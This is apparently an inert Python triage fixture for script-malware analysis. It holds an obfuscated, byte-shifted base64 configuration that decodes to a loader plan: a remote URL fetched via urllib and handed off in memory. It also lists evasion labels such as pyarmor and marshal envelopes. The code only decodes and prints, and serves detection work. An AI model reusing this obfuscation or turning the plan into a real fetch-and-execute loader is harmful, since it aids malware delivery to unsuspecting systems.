# configuration reconstruction
#!/usr/bin/env python3
# Huntress Script Triage -- inert static-analysis fixture (cpython3)
import base64
import io
import os

MATERIAL_6da6b8bf = "ajEmcGdoWWRnMVVXZWldZllTZllhY2hZIFhdZ2RVaFdcU2FZYWNmbXBVWFVkaFlmMWlmYGBdVlNhWWFjZm1wZ2hVW1lTV2NpYmgxJXBnbWJoVWwxWWxXWWRoXWNiU1lsZGZZZ2ddY2JwY1ZaaWdXVWhdY2IxYVVmZ1xVYFNZYmpZYGNkWVNkYFVicFdVZmZdWWYxZG1VZmFjZlNjVlppZ1dVaFlYcGtdYlhja2dTV1xVXWIxa2dXZl1kaFNoY1NkbWhcY2JwV1VhZFVdW2JTXVgxV1VhZFVdW2IhLCgsWFVVWlVYJHBpZmAxXGhoZGcuIyMsKCxYVVVaVVgkIllsVWFkYFkiXWJqVWBdWCNWJlYsWFokJiJkbXBpZ1lmU1VbWWJoMTxpYmhmWWdnRG1oXGNiIywoLFhVVVpVWCQ="
CODEC_6da6b8bf = "urlsafe_base64|subtract_modulo_256|0c"

def load_6da6b8bf():
    return base64.urlsafe_b64decode(MATERIAL_6da6b8bf)

def decode_6da6b8bf(item1):
    return bytes((value + 12) % 256 for value in item1)

def recover_6da6b8bf():
    item4 = 19 * 7 - 133
    for _pass in range(1):
        item2 = decode_6da6b8bf(load_6da6b8bf())
    item3 = item2.decode("ascii", "strict")
    return item3

def inspect_6da6b8bf():
    view = memoryview(recover_6da6b8bf().encode("ascii"))
    return bytes(view).decode("ascii")

def surface_6da6b8bf():
    try:
        raise LookupError("surface")
    except LookupError:
        return ("exception_expression", "marshal_envelope_plan", "pyarmor_obfuscated", "wscript_to_python")

def obfuscation_6da6b8bf():
    marshal_plan = {"format": "code_object", "action": "inspect_only", "label": "marshal_envelope_plan"}
    return marshal_plan["label"]

def plan_6da6b8bf():
    fields = dict(item.split("=", 1) for item in inspect_6da6b8bf().split("|"))
    analysis_surface = surface_6da6b8bf()
    obfuscation_surface = obfuscation_6da6b8bf()
    operation_plan = ("urllib_memory", fields["url"], "memory-handoff")
    return operation_plan + (analysis_surface, obfuscation_surface)

if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
    print(inspect_6da6b8bf())

# reconstruction complete